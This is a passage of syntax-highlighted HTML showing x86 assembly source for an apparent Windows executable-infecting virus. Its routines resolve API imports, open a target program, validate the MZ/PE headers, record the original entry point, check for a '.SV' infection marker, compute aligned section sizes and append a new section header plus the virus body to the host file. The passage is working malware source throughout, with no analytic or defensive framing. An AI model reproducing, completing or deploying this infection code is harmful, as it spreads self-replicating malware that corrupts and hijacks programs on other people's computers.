        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetKrnlImport</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetImport</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;parm: esi = fct struct ( dd ptr, dd HInst ptr, db[] name )</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">PGetProcAdr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetImport</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectFileA</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;parms: esi = FileName</span><span class="sc0">
</span><span class="sc1">;return: CF = 0 : ok, 1 : Nope!</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SCreateFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrRet</span><span class="sc0">                  </span><span class="sc1">;not opened</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;but we need only the low dword</span><span class="sc0">
                                                </span><span class="sc1">;( this PTR-&gt;High dword )</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;of FHndl</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SFSize</span><span class="sc0">                  </span><span class="sc1">;get file size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">               </span><span class="sc1">;Plus some other bytes for me</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;file size bytes++</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">GMEM_FIXED</span><span class="sc0">            </span><span class="sc1">;so that it don't move ;)</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SMAlloc</span><span class="sc0">                 </span><span class="sc1">;allocate global memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;esi=PTR -&gt; our memory</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrRetA</span><span class="sc0">                 </span><span class="sc1">;not enough memory!</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;here will be number of bytes</span><span class="sc0">
                                                </span><span class="sc1">;"well-readed"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;there!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;and from there...</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SReadFile</span><span class="sc0">               </span><span class="sc1">;now, put raw file in memory</span><span class="sc0">
                                                </span><span class="sc1">;note: always work...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ErrRetB</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;Now that the file is mapped, we can begin... 1st: let look for the</span><span class="sc0">
</span><span class="sc1">;entry point RVA, that will come in 'FutureEIP'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;PE offset in file, like a RVA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Dos EXE have some nasty values...</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ErrRetB</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;esi=PTR -&gt; PE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ErrRetB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Prog entry point (RVA)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Plus base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FutureEIP</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc1">;Now, we have to put our section...</span><span class="sc0">
</span><span class="sc1">;We have to know where to put the section header in the file</span><span class="sc0">
</span><span class="sc1">;(if we have enough room), and where we could put it in memory</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;number of sections</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;size of optional header</span><span class="sc0">
                                                </span><span class="sc1">;it come at offset 18 in</span><span class="sc0">
                                                </span><span class="sc1">;the header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc0">                </span><span class="sc1">;What info we need...</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ErrRetB</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0a4h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Size of relocation datas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelSz</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;Save it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0a0h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;RVA of relocation datas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;Save it!</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ebx=1st section header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;unsigned=&gt;maxxxxx.....</span><span class="sc0">
</span><span class="sc5">SLLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;RVA of section</span><span class="sc0">
        </span><span class="sc1">;|SctRVA=edx|   |RelRVA|    |SctRVA+SctSz|</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">NotReloc2</span><span class="sc0">               </span><span class="sc1">;|RelRVA|     |SctRVA| |SctRVA+SctSz|</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;|SctRVA| EDX |RelRVA| |SctRVA+SctSz|</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;cmp edx,SctSz</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">NotReloc1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Where section is in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelFle</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;Save where Relocations are in file</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;restore edx</span><span class="sc0">
</span><span class="sc5">NotReloc1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;restore edx</span><span class="sc0">
</span><span class="sc5">NotReloc2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;size of section</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">NotAfterRam</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">NotAfterRam</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Where section is in file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NotBeforeFle</span><span class="sc0">            </span><span class="sc1">;if 0 =&gt; not in file/initialised</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">NotBeforeFle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">NotBeforeFle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">;28h=size of section header</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">SLLoop</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;ebx=RVA of after section headers</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">;28h=size of section header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">ErrRetB</span><span class="sc0">                 </span><span class="sc1">;not enough room for my header :(((</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
</span><span class="sc1">;Perhaps is that file already infected...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0056532Eh</span><span class="sc0"> </span><span class="sc1">; '.SV', 0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OkRet</span><span class="sc0">                   </span><span class="sc1">;Already infected</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">;28h=size of section header</span><span class="sc0">

</span><span class="sc1">;We have to calculate the size of section and in the infected file</span><span class="sc0">
</span><span class="sc1">;with the file alignement and his size in the ram...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;Do not exchange this 2 push, cuz we</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;will get this w/ [esp]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;file alignement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">KeepSFlSize</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">KeepSFlSize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">KeepSFlOff</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">KeepSFlOff</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PlusSize</span><span class="sc4">+</span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Alignement</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">KeepSRSize</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">KeepSRSize</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">KeepSRVA</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">KeepSRVA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;;Set properly some internals variables</span><span class="sc0">
</span><span class="sc1">;        mov     edx,[offset SRVA+edi]</span><span class="sc0">
</span><span class="sc1">;        add     [offset FutureEIP+edi],edx</span><span class="sc0">
</span><span class="sc1">;Copy section header in the file</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SectionHdr</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">
</span><span class="sc1">;Copy me at end of file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusBegin</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">VirusSize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

